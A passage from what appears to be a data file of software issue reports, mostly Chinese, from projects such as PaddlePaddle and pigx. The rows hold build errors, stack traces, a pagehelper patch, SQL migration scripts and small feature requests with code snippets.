_this.searchForm ) ) .then(response =&gt; { _this.tableData = response.data.data.records; _this.page.total = response.data.data.total; _this.tableLoading = false; }) .catch(() =&gt; { _this.tableLoading = false; }); }; /** * 新增事件 */ const handleSave = function (argumentsArr, _this) { var row = argumentsArr[0]; var done = argumentsArr[1]; var loading = argumentsArr[2]; _this.addObj(row) .then(data =&gt; { _this.$message.success(""添加成功""); done(); getList([_this.page, _this.searchForm], _this); }) .catch(() =&gt; { loading(); }); }; /** * 更新事件 */ const handleUpdate = function (argumentsArr, _this) { var row = argumentsArr[0]; var index = argumentsArr[1]; var done = argumentsArr[2]; var loading = argumentsArr[3]; _this.putObj(row) .then(data =&gt; { _this.$message.success(""修改成功""); done(); getList([_this.page, _this.searchForm], _this); }) .catch(() =&gt; { loading(); }); }; /** * 删除事件 */ const rowDel = function (argumentsArr, _this) { var row = argumentsArr[0]; var index = argumentsArr[1]; index += ((_this.page.currentPage - 1) * _this.page.pageSize); _this.$confirm(""确认删除序号为‘"" + (index + 1) + ""’的数据？"", ""提示"", { confirmButtonText: ""确定"", cancelButtonText: ""取消"", type: ""warning"" }) .then(function () { return _this.delObj(row[_this.$refs.crud.rowKey]); }) .then(data =&gt; { _this.$message.success(""删除成功""); getList([_this.page, _this.searchForm], _this); }); }; /** * 权限处理 */ const handlePermission = function (_this, add, del, edit) { return { addBtn: _this.vaildData(_this.permissions[add], false), delBtn: _this.vaildData(_this.permissions[del], false), editBtn: _this.vaildData(_this.permissions[edit], false) } }; export default { //crud初始化相关方法 getList, handleSave, handleUpdate, rowDel, searchChange, currentChange, sizeChange, refreshChange, searchReset, selectionChange, handlePermission } // 导入共用组件 import common from '../public/vue/common.js' Vue.prototype.BASE = base /** * 新增 * @param selfSaveFunction 自定义新增方法,非必传 */ const handleSave = function (argumentsArr, _this, selfSaveFunction) { var row = argumentsArr[0]; var done = argumentsArr[1]; var loading = argumentsArr[2]; if (selfSaveFunction &amp;&amp; typeof selfSaveFunction == ""function"") { row = selfSaveFunction(row); } _this.addObj(row) .then(data =&gt; { _this.$message.success(""添加成功""); done(); getList([_this.page, _this.searchForm], _this); }) .catch(() =&gt; { loading(); }); }; @row-save=""BASE.handleSave(arguments,thisObj,demoMethod)"" methods: { demoMethod(row) { row.id = 12; } } // 或者直接调用 @row-save=""toSave"" methods: { toSave(row) { this.BASE.handleSave([form, done, loading],thisObj); }"
sigmoid_with_cross_entropy need be exposed.,"Also, the output should be changed to for the API consistency.   <code>: labels label"
Build error in lite_mul_model_test.cc,"Most likely, the changes made to the contribution number: https://github.com/PaddlePaddle/Paddle/commit/7d91974c91b427d12e40a644518993a22dc0b1a3 corrupted the python paddle module build process. CMAKE: SYSTEM: Build log with error:   <code>: cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_GPU=OFF -DWITH_MKLDNN=ON -DWITH_TESTING=ON -DWITH_PROFILER=ON -DWITH_STYLE_CHECK=OFF -DON_INFER=ON -DWITH_INFERENCE_API_TEST=ON -- Found Paddle host system: ubuntu, version: 18.04.4 -- Found Paddle host system's CPU: 80 cores -- The CXX compiler identification is GNU 4.8.5 -- The C compiler identification is GNU 4.8.5 [ 99%] Building CXX object paddle/fluid/inference/tests/api/CMakeFiles/test_analyzer_capi.dir/analyzer_capi_tester.cc.o /repos/paddle_paddle/paddle/fluid/inference/tests/api/lite_mul_model_test.cc: In function 'int paddle::inference::test_predictor_zero_copy(const paddle::AnalysisConfig&amp;, paddle::inference::Barrier*)': /repos/paddle_paddle/paddle/fluid/inference/tests/api/lite_mul_model_test.cc:79:12: error: base operand of '-&gt;' has non-pointer type 'std::initializer_list&lt;std::unique_ptr&lt;paddle::ZeroCopyTensor&gt; &gt;' in_tensor-&gt;Reshape({1, 1}); ^ /repos/paddle_paddle/paddle/fluid/inference/tests/api/lite_mul_model_test.cc:80:12: error: base operand of '-&gt;' has non-pointer type 'std::initializer_list&lt;std::unique_ptr&lt;paddle::ZeroCopyTensor&gt; &gt;' in_tensor-&gt;copy_from_cpu(input.data()); ^ /repos/paddle_paddle/paddle/fluid/inference/tests/api/lite_mul_model_test.cc:87:13: error: base operand of '-&gt;' has non-pointer type 'std::initializer_list&lt;std::unique_ptr&lt;paddle::ZeroCopyTensor&gt; &gt;' out_tensor-&gt;copy_to_cpu(data_o.data()); ^ paddle/fluid/inference/tests/api/CMakeFiles/lite_mul_model_test.dir/build.make:75: recipe for target 'paddle/fluid/inference/tests/api/CMakeFiles/lite_mul_model_test.dir/lite_mul_model_test.cc.o' failed"
关于predict.py进行输入流预测的问题,"我新下了sentiment的predict.sh 与 predict.py https://github.com/PaddlePaddle/Paddle/tree/develop/demo/sentiment 在这个网络中，可以对输入流进行预测输出。 但是我把predict.py移植到其他网络（这里是quick_start的网络结构）中，却报错: 请问有没有一个通用的方式可以处理数据流的预测输出？或者是我哪里配置的不对么？   <code>: I1231 00:18:59.383359 9473 Util.cpp:155] commandline: --use_gpu=0 I1231 00:18:59.383488 9473 Util.cpp:130] Calling runInitFunctions I1231 00:18:59.383779 9473 Util.cpp:143] Call runInitFunctions done. [WARNING 2016-12-31 00:19:00,650 networks.py:1438] `outputs` routine try to calculate network's inputs and outputs order. It might not work well.Please see follow log carefully. [INFO 2016-12-31 00:19:00,650 networks.py:1466] The input order is [word] [INFO 2016-12-31 00:19:00,651 networks.py:1472] The output order is [__maxid_layer_0__, __fc_layer_0__] I1231 00:19:00.676092 9473 GradientMachine.cpp:123] Loading parameters from output/pass-00014 F1231 00:19:00.677177 9473 FullyConnectedLayer.cpp:86] Check failed: input.value The input of 'fc' layer must be matrix *** Check failure stack trace: *** @ 0x7f59b0e03868 google::LogMessage::Fail() @ 0x7f59b0e037c0 google::LogMessage::SendToLog() @ 0x7f59b0e03255 google::LogMessage::Flush() @ 0x7f59b0e06016 google::LogMessageFatal::~LogMessageFatal() @ 0x7f59b050654b paddle::FullyConnectedLayer::forward() @ 0x7f59b056feba paddle::NeuralNetwork::forward() @ 0x7f59b0459026 _wrap_GradientMachine_forward @ 0x4b4cb9 PyEval_EvalFrameEx @ 0x4b6b28 PyEval_EvalCodeEx @ 0x4b5d10 PyEval_EvalFrameEx @ 0x4b6b28 PyEval_EvalCodeEx @ 0x4b5d10 PyEval_EvalFrameEx @ 0x4b5fb8 PyEval_EvalFrameEx @ 0x4b5fb8 PyEval_EvalFrameEx @ 0x4b6b28 PyEval_EvalCodeEx @ 0x4b6c52 PyEval_EvalCode @ 0x4e1c7d PyRun_FileExFlags @ 0x4e3501 PyRun_SimpleFileExFlags @ 0x4159dd Py_Main @ 0x7f59b961dbd5 __libc_start_main @ 0x414b71 (unknown) predict2.sh: line 27: 9469 Broken pipe cat ./data2/data.test 9473 Aborted (core dumped) | python predict2.py --tconf=$config --model=$model --label=$label --dict=./data2/dict.txt --batch_size=1`"
jsch 执行命令后无法使用 system.err.println()问题 ,"JDK版本： openjdk_8_201 hutool版本： 5.7.9   <code>: String result = JschUtil.exec(session, ""free"", Charset.forName(""utf8"")); System.out.println(""out nice""); System.err.println(""err nice"");"
增加isBlank 用于判断字符串是否未空，比isEmpty更好,如题，类似   <code>: @if(isBlank(name)){ @} @if(isEmpty(age)){ @}
左侧键值目录显示错误,Windows1.5.5版本，存在键值显示错误问题。在之前1.4.x版本中显示正常的。 错误如下： 1.键为： 则显示为空 2.键为：则显示为 似乎忽略了所有的英文字符。   <code>: &lt;AAA&gt;&lt;BBB&gt; &lt;AAAAA&gt;&lt;11111&gt; &lt;11111&gt;
使用RPC时，因Page类引用了RowBounds，导致反序列化失败,"在使用dubbo时，消费端RPC调用后端服务，消费端并没有任何连接数据库的权限，因此不需要引入mybatis依赖，此时后端返回的集合是分页插件的Page类，这个类引用了RowBounds，导致消费端反序列化Page类时，找不到RowBounds类。   <code>: From 2958c17800771fb313cb1acd150d087c11a7a133 Mon Sep 17 00:00:00 2001 From: ""Jinkai.Ma"" &lt;majinkai@handu.com&gt; Date: Wed, 9 Sep 2015 16:44:59 +0800 Subject: [PATCH] =?UTF-8?q?=E4=B8=8D=E4=BE=9D=E8=B5=96RowBounds?= MIME-Version: 1.0 Content-Type: text/plain; charset=UTF-8 Content-Transfer-Encoding: 8bit --- src/main/java/com/github/pagehelper/Page.java | 17 +++++------------ src/main/java/com/github/pagehelper/SqlUtil.java | 6 ++---- 2 files changed, 7 insertions(+), 16 deletions(-) diff --git a/src/main/java/com/github/pagehelper/Page.java b/src/main/java/com/github/pagehelper/Page.java index 314b9dc..4c30948 100644 --- a/src/main/java/com/github/pagehelper/Page.java +++ b/src/main/java/com/github/pagehelper/Page.java @@ -24,8 +24,6 @@ package com.github.pagehelper; -import org.apache.ibatis.session.RowBounds; - import java.util.ArrayList; import java.util.List; @@ -105,23 +103,18 @@ public class Page&lt;E&gt; extends ArrayList&lt;E&gt; { setReasonable(reasonable); } - public Page(RowBounds rowBounds, boolean count) { - this(rowBounds, count ? Page.SQL_COUNT : Page.NO_SQL_COUNT); - } - - - public Page(RowBounds rowBounds, int total) { + public Page(int offset, int limit, int total) { super(0); - if (rowBounds.getOffset() == 0 &amp;&amp; rowBounds.getLimit() == Integer.MAX_VALUE) { + if (offset == 0 &amp;&amp; limit == Integer.MAX_VALUE) { pageSizeZero = true; this.pageSize = 0; } else { - this.pageSize = rowBounds.getLimit(); + this.pageSize = limit; } - this.startRow = rowBounds.getOffset(); + this.startRow = offset; //RowBounds方式默认不求count总数，如果想求count,可以修改这里为SQL_COUNT this.total = total; - this.endRow = this.startRow + rowBounds.getLimit(); + this.endRow = this.startRow + limit; } public List&lt;E&gt; getResult() { diff --git a/src/main/java/com/github/pagehelper/SqlUtil.java b/src/main/java/com/github/pagehelper/SqlUtil.java index 81e3675..241bcdf 100644 --- a/src/main/java/com/github/pagehelper/SqlUtil.java +++ b/src/main/java/com/github/pagehelper/SqlUtil.java @@ -294,10 +294,8 @@ public class SqlUtil implements Constant { if (page == null) { if (params instanceof RowBounds) { RowBounds rowBounds = (RowBounds) params; - if (offsetAsPageNum) { - page = new Page(rowBounds.getOffset(), rowBounds.getLimit(), rowBoundsWithCount); - } else { - page = new Page(rowBounds, rowBoundsWithCount); + page = new Page(rowBounds.getOffset(), rowBounds.getLimit(), rowBoundsWithCount); + if (!offsetAsPageNum) { //offsetAsPageNum=false的时候，由于PageNum问题，不能使用reasonable，这里会强制为false page.setReasonable(false); } -- 2.3.2 (Apple Git-55)"
【众智】【计算-AICPU接入】Addcdiv,"Addcdiv (tensor1 / tensor2) * value + input input_data x1 x2 value y 对应底层算子 对应底层AICPU算子Addcdiv Classify Name Type Type Range Required Format INPUT input_data fp16, float, double, int64 TRUE INPUT x1 fp16, float, double, int64 TRUE INPUT x2 fp16, float, double, int64 TRUE INPUT value fp16, float, double, int32, int64 TRUE OUTPUT y fp16, float, double, int64 TRUE 标杆接口参考 PyTorch接口： https://pytorch.org/docs/stable/generated/torch.addcdiv.html 3. 异常处理 4. 算子反向 参考Pytorch算子反向实现，依赖Conj算子。   <code>: class Addcdiv(Primitive):"
启动PigxAdminApplication报错,"pigx版本: 2.6.0 操作系统: win10 64位 是否修改包名: 没有 正常启动eureka、config、gateway、auth应用, 然后启动PigxAdminApplication报错以上   <code>: Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 2019-03-13 13:48:22.138 INFO 9148 --- [ restartedMain] o.s.c.n.e.s.EurekaServiceRegistry : Unregistering application PIGX-UPMS-BIZ with eureka with status DOWN 2019-03-13 13:48:22.138 INFO 9148 --- [ restartedMain] com.netflix.discovery.DiscoveryClient : Shutting down DiscoveryClient ... 2019-03-13 13:48:22.148 INFO 9148 --- [ restartedMain] com.netflix.discovery.DiscoveryClient : Completed shut down of DiscoveryClient 2019-03-13 13:48:22.165 ERROR 9148 --- [ restartedMain] o.s.boot.SpringApplication : Application run failed org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'tokenController' defined in file [E:\Pigx\pigx-parent\pigx-upms\pigx-upms-biz\target\classes\com\pig4cloud\pigx\admin\controller\TokenController.class]: Unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'com.pig4cloud.pigx.admin.api.feign.RemoteTokenService': FactoryBean threw exception on object creation; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'pigxFeignTargeter' defined in class path resource [org/springframework/cloud/openfeign/PigxHystrixFeignTargeterConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.cloud.openfeign.Targeter]: Factory method 'pigxFeignTargeter' threw exception; nested exception is java.lang.IllegalAccessError: class org.springframework.cloud.openfeign.PigxHystrixTargeter cannot access its superinterface org.springframework.cloud.openfeign.Targeter at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:769) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:218) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1325) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1171) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:555) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:515) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:320) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:318) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:199) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:849) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:877) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:549) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:142) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:775) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:397) at org.springframework.boot.SpringApplication.run(SpringApplication.java:316) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1260) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1248) at com.pig4cloud.pigx.admin.PigxAdminApplication.main(PigxAdminApplication.java:26) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.boot.devtools.restart.RestartLauncher.run(RestartLauncher.java:49) Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'com.pig4cloud.pigx.admin.api.feign.RemoteTokenService': FactoryBean threw exception on object creation; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'pigxFeignTargeter' defined in class path resource [org/springframework/cloud/openfeign/PigxHystrixFeignTargeterConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.cloud.openfeign.Targeter]: Factory method 'pigxFeignTargeter' threw exception; nested exception is java.lang.IllegalAccessError: class org.springframework.cloud.openfeign.PigxHystrixTargeter cannot access its superinterface org.springframework.cloud.openfeign.Targeter at org.springframework.beans.factory.support.FactoryBeanRegistrySupport.doGetObjectFromFactoryBean(FactoryBeanRegistrySupport.java:178) at org.springframework.beans.factory.support.FactoryBeanRegistrySupport.getObjectFromFactoryBean(FactoryBeanRegistrySupport.java:101) at org.springframework.beans.factory.support.AbstractBeanFactory.getObjectForBeanInstance(AbstractBeanFactory.java:1674) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.getObjectForBeanInstance(AbstractAutowireCapableBeanFactory.java:1233) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:257) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:199) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:277) at org.springframework.beans.factory.support.DefaultListableBeanFactory.addCandidateEntry(DefaultListableBeanFactory.java:1470) at org.springframework.beans.factory.support.DefaultListableBeanFactory.findAutowireCandidates(DefaultListableBeanFactory.java:1427) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1210) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1167) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:857) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:760) ... 24 common frames omitted Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'pigxFeignTargeter' defined in class path resource [org/springframework/cloud/openfeign/PigxHystrixFeignTargeterConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.cloud.openfeign.Targeter]: Factory method 'pigxFeignTargeter' threw exception; nested exception is java.lang.IllegalAccessError: class org.springframework.cloud.openfeign.PigxHystrixTargeter cannot access its superinterface org.springframework.cloud.openfeign.Targeter at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:627) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:456) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1305) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1144) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:555) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:515) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:320) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:318) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:224) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveNamedBean(DefaultListableBeanFactory.java:1115) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveBean(DefaultListableBeanFactory.java:407) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveBean(DefaultListableBeanFactory.java:413) at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBean(DefaultListableBeanFactory.java:341) at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBean(DefaultListableBeanFactory.java:335) at org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:1123) at org.springframework.cloud.context.named.NamedContextFactory.getInstance(NamedContextFactory.java:132) at org.springframework.cloud.openfeign.FeignClientFactoryBean.get(FeignClientFactoryBean.java:208) at org.springframework.cloud.openfeign.FeignClientFactoryBean.loadBalance(FeignClientFactoryBean.java:225) at org.springframework.cloud.openfeign.FeignClientFactoryBean.getTarget(FeignClientFactoryBean.java:254) at org.springframework.cloud.openfeign.FeignClientFactoryBean.getObject(FeignClientFactoryBean.java:235) at org.springframework.beans.factory.support.FactoryBeanRegistrySupport.doGetObjectFromFactoryBean(FactoryBeanRegistrySupport.java:171) ... 36 common frames omitted Caused by: org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.cloud.openfeign.Targeter]: Factory method 'pigxFeignTargeter' threw exception; nested exception is java.lang.IllegalAccessError: class org.springframework.cloud.openfeign.PigxHystrixTargeter cannot access its superinterface org.springframework.cloud.openfeign.Targeter at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:185) at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:622) ... 57 common frames omitted Caused by: java.lang.IllegalAccessError: class org.springframework.cloud.openfeign.PigxHystrixTargeter cannot access its superinterface org.springframework.cloud.openfeign.Targeter at java.lang.ClassLoader.defineClass1(Native Method) at java.lang.ClassLoader.defineClass(ClassLoader.java:763) at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142) at java.net.URLClassLoader.defineClass(URLClassLoader.java:467) at java.net.URLClassLoader.access$100(URLClassLoader.java:73) at java.net.URLClassLoader$1.run(URLClassLoader.java:368) at java.net.URLClassLoader$1.run(URLClassLoader.java:362) at java.security.AccessController.doPrivileged(Native Method) at java.net.URLClassLoader.findClass(URLClassLoader.java:361) at org.springframework.boot.devtools.restart.classloader.RestartClassLoader.findClass(RestartClassLoader.java:163) at org.springframework.boot.devtools.restart.classloader.RestartClassLoader.loadClass(RestartClassLoader.java:145) at java.lang.ClassLoader.loadClass(ClassLoader.java:357) at org.springframework.cloud.openfeign.PigxHystrixFeignTargeterConfiguration.pigxFeignTargeter(PigxHystrixFeignTargeterConfiguration.java:23) at org.springframework.cloud.openfeign.PigxHystrixFeignTargeterConfiguration$$EnhancerBySpringCGLIB$$ea21b7b5.CGLIB$pigxFeignTargeter$0(&lt;generated&gt;) at org.springframework.cloud.openfeign.PigxHystrixFeignTargeterConfiguration$$EnhancerBySpringCGLIB$$ea21b7b5$$FastClassBySpringCGLIB$$a090e7ff.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invokeSuper(MethodProxy.java:244) at org.springframework.context.annotation.ConfigurationClassEnhancer$BeanMethodInterceptor.intercept(ConfigurationClassEnhancer.java:363) at org.springframework.cloud.openfeign.PigxHystrixFeignTargeterConfiguration$$EnhancerBySpringCGLIB$$ea21b7b5.pigxFeignTargeter(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:154) ... 58 common frames omitted Disconnected from the target VM, address: '127.0.0.1:63454', transport: 'socket' Process finished with exit code 1"
" Variable value (label) of OP(fluid.layers.cross_entropy) expected >= 0 and < 5, but got 5. ","Hello everyone! I have dataset with 8 features and 1 label column. My label could be: 1 , 2 , 3 , 4 , 5. So there are 5 different values. I defined predict layer in my Liner Regression like that: So outputs could be only in range of 5 values. When I am starting training I ger this: Why?   <code>: def lr_network(self): self.inputs = fluid.layers.data( name='x', shape=[1, 8], dtype=""float32"") self.label = fluid.layers.data(name='label', shape=[1], dtype='int64') self.predict = fluid.layers.fc(input=self.inputs, size=5, act='softmax') self.sum_cost = fluid.layers.cross_entropy( input=self.predict, label=self.label) self.accuracy = fluid.layers.accuracy( input=self.predict, label=self.label) self.loss = fluid.layers.mean(self.sum_cost) self.startup_program = fluid.default_startup_program() Error: Variable value (label) of OP(fluid.layers.cross_entropy) expected &gt;= 0 and &lt; 5, but got 5. Please check label value. at (/paddle/paddle/fluid/operators/cross_entropy_op.h:175) [operator &lt; cross_entropy2 &gt; error]"
代码生成支持达梦数据库,"环境信息 pigx版本: v4.4 是否修改包名: 否 提供详细   <code>: &lt;?xml version=""1.0"" encoding=""UTF-8""?&gt; &lt;!DOCTYPE mapper PUBLIC ""-//mybatis.org//DTD Mapper 3.0//EN"" ""http://mybatis.org/dtd/mybatis-3-mapper.dtd""&gt; &lt;mapper namespace=""com.pig4cloud.pigx.codegen.mapper.GeneratorDmMapper""&gt; &lt;select id=""queryTable"" resultType=""map""&gt; SELECT DISTINCT ut.TABLE_NAME AS ""tableName"", utc.comments AS ""tableComment"" FROM user_tables ut, user_tab_comments utc WHERE ut.TABLE_NAME = utc.TABLE_NAME &lt;if test=""tableName != null and tableName.trim() != ''""&gt; and ut.TABLE_NAME = #{tableName} &lt;/if&gt; ORDER BY ut.TABLE_NAME &lt;/select&gt; &lt;sql id=""queryColumn""&gt; SELECT 'oracle' AS ""dbType"", TEMP.COLUMN_NAME AS ""columnName"", TEMP.data_type AS ""columnType"", TEMP.data_type AS ""dataType"", TEMP.comments AS ""comments"", CASE TEMP.constraint_type WHEN 'P' THEN 'PRI' WHEN 'C' THEN 'UNI' ELSE'' END ""COLUMNKEY"" FROM ( SELECT col.column_id, col.COLUMN_NAME, col.data_type, colc.comments, uc.constraint_type, ROW_NUMBER ( ) OVER ( PARTITION BY col.COLUMN_NAME ORDER BY uc.constraint_type DESC ) AS row_flg FROM user_tab_columns col LEFT JOIN user_col_comments colc ON colc.TABLE_NAME = col.TABLE_NAME AND colc.COLUMN_NAME = col. COLUMN_NAME LEFT JOIN user_cons_columns ucc ON ucc.TABLE_NAME = col.TABLE_NAME AND ucc.COLUMN_NAME = col. COLUMN_NAME LEFT JOIN user_constraints uc ON uc.CONSTRAINT_NAME = ucc.CONSTRAINT_NAME WHERE col.TABLE_NAME = #{tableName} ) TEMP WHERE TEMP.row_flg = 1 ORDER BY TEMP.column_id &lt;/sql&gt; &lt;select id=""selectTableColumn"" resultType=""com.pig4cloud.pigx.codegen.entity.ColumnEntity""&gt; &lt;include refid=""queryColumn""/&gt; &lt;/select&gt; &lt;select id=""selectMapTableColumn"" resultType=""map""&gt; &lt;include refid=""queryColumn""/&gt; &lt;/select&gt; &lt;/mapper&gt;"
add gserver to capi dep,"fix: #9135:API doc problems of split_lod_tensor, merge_lod_tensor gserver is missing from capi's dep list, which leads to the compiling error ""no such file of "" fixed by adding gserver to capi's dep list.   <code>: ctc.h"
v4.4-changelog不支持mysql5.7,"环境信息 pigx版本: 4.4 是否修改包名: 否 提供详细 MySQL5.7 缺少utf8mb4_0900_ai_ci字符集   <code>: use pigxx; CREATE TABLE `sys_post` ( `post_id` bigint NOT NULL COMMENT '岗位ID', `post_code` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL COMMENT '岗位编码', `post_name` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL COMMENT '岗位名称', `post_sort` int NOT NULL COMMENT '岗位排序', `remark` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL COMMENT '岗位描述', `del_flag` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL DEFAULT '0' COMMENT '是否删除 -1：已删除 0：正常', `create_time` datetime(0) NULL DEFAULT NULL COMMENT '创建时间', `create_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL DEFAULT '' COMMENT '创建人', `update_time` datetime(0) NULL DEFAULT NULL COMMENT '更新时间', `update_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL DEFAULT '' COMMENT '更新人', `tenant_id` bigint NULL DEFAULT NULL COMMENT '租户ID', PRIMARY KEY (`post_id`) USING BTREE ) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '岗位信息表' ROW_FORMAT = Dynamic; ALTER TABLE `sys_social_details` ADD COLUMN `ext` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '扩展字段' AFTER `redirect_url`; ALTER TABLE `sys_tenant` ADD COLUMN `tenant_domain` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL AFTER `code`; CREATE TABLE `sys_user_post` ( `user_id` bigint NOT NULL COMMENT '用户ID', `post_id` bigint NOT NULL COMMENT '岗位ID', PRIMARY KEY (`user_id`, `post_id`) USING BTREE ) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '用户与岗位关联表' ROW_FORMAT = DYNAMIC;"
tree插件替换默认显示字段,"ruoyi框架里面的tree插件可以替换默认显示字段吗,就是name改成nameE这样,找了好久都没有找到   <code>: $(function() { var url = ctx + ""system/menu/roleMenuTreeData""; var options = { id: ""menuTrees"", url: url, check: { enable: true, nocheckInherit: true, chkboxType: { ""Y"": ""ps"", ""N"": ""ps"" } }, expandLevel: 0 }; console.log(options) $.tree.init(options); });"
[GraphKernel]Clean the GraphKernel's codes from frontend,"Task Description 将前端的设成deprecated, 退化成 将前端的设置成deprecated, 建议换成 清理接口, 全部换成调用基本算子 清理图算融合在前端的两个pass 清理以前图算融合对其他模块侵入式修改的代码 Task Goal 图算融合不再支持用户从前端写的白盒算子，仅在后端所有优化pass完成之后再做进一步优化。与前端彻底解耦。   <code>: GraphKernel Cell InplaceAssign Assign op_selector"
